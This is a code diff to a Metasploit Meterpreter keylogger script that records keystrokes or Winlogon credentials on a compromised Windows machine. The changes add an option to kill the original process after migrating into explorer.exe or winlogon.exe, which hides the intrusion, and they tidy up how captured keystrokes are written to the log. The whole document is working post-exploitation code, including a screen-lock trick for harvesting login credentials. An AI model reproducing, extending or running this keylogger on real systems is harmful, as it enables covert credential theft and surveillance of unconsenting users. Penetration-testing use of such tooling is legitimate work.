@@ -1,6 +1,7 @@
 # $Id$
 # $Revision$
 # Author: Carlos Perez at carlos_perez[at]darkoperator.com
+# Updates by Shellster
 #-------------------------------------------------------------------------------
 session = client
 # Script Options
@@ -8,7 +9,8 @@ session = client
 	"-h"  => [ false, "Help menu." ],
 	"-t"  => [ true,  "Time interval in seconds between recollection of keystrokes, default 30 seconds." ],
 	"-c"  => [ true,  "Type of key capture. (0) for user key presses or (1) for winlogon credential capture Default is 0." ],
-	"-l"  => [ false, "Lock screen when capturing Winlogon credentials."]
+	"-l"  => [ false, "Lock screen when capturing Winlogon credentials."],
+	"-k" => [ false, "Kill old Process"]
 )
 def usage
 	print_line("Keylogger Recorder Meterpreter Script")
@@ -50,8 +52,12 @@ def lock_screen
 	end
 end
 #Function to Migrate in to Explorer process to be able to interact with desktop
-def explrmigrate(session,captype,lock)
+def explrmigrate(session,captype,lock,kill)
 	#begin
+	
+	server = client.sys.process.open
+	original_pid = server.pid
+	
 	if captype.to_i == 0
 		process2mig = "explorer.exe"
 	elsif captype.to_i == 1
@@ -73,6 +79,12 @@ def explrmigrate(session,captype,lock)
 			print_status("\t#{process2mig} Process found, migrating into #{x['pid']}")
 			session.core.migrate(x['pid'].to_i)
 			print_status("Migration Successful!!")
+			
+			if (kill)
+				print_status("Killing old process")
+				client.sys.process.kill(original_pid)
+				print_status("Old process killed.") 
+			end
 		end
 	end
 	return true
@@ -125,7 +137,10 @@ def write_keylog_data session, logfile
 	end
 
 	sleep(2)
-	file_local_write(logfile,"#{outp}\n")
+
+	if(outp.length > 0)
+		file_local_write(logfile,"#{outp}\n")
+	end
 end
 
 # Function for Collecting Capture
@@ -133,6 +148,8 @@ def keycap(session, keytime, logfile)
 	begin
 		rec = 1
 		#Creating DB for captured keystrokes
+		file_local_write(logfile,"")
+		
 		print_status("Keystrokes being saved in to #{logfile}")
 		#Inserting keystrokes every number of seconds specified
 		print_status("Recording ")
@@ -157,6 +174,8 @@ end
 
 helpcall = 0
 lock = false
+kill = false
+
 @@exec_opts.parse(args) { |opt, idx, val|
 	case opt
 	when "-t"
@@ -167,10 +186,12 @@ lock = false
 		usage
 	when "-l"
 		lock = true
+	when "-k"
+		kill = true	
 	end
 }
 if client.platform =~ /win32|win64/
-	if explrmigrate(session,captype,lock)
+	if explrmigrate(session,captype,lock, kill)
 		if startkeylogger(session)
 			keycap(session, keytime, logfile)
 		end
